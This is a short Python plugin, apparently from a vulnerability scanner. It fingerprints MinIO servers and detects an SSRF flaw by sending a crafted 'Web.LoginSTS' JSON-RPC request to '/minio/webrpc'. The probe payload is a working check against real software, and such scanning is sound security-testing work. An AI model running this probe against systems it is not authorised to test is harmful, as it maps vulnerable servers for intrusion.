# -*- coding:utf-8 -*-
# MinIO SSRF

from .. import requestUtil
from ServiceScanModel.models import ServiceScan


def minio_ssrf_poc(url):
    resp = requestUtil.post(url + "/minio/webrpc", header={"Content-Type": "application/json"},
                            data='{"id":1,"jsonrpc":"2.0","params":{"type": "test"},"method":"Web.LoginSTS"}')
    print(resp.text)
    if "We encountered an internal error, please try again." in resp.text:
        return True

def fingerprint(service):

    try:
        if service.url:
            resp = requestUtil.get(service.url + "/minio/login")
            if "MinIO Browser" in resp.text:
                return True
    except:
        return False


def poc(service: ServiceScan):
    try:
        if minio_ssrf_poc(service.url):
            return ["MinIO SSRF", 'vuln path: /minio/webrpc<br>post data: {"id":1,"jsonrpc":"2.0","params":{"type" "test"},"method":"Web.LoginSTS"}']
    except:
        return []
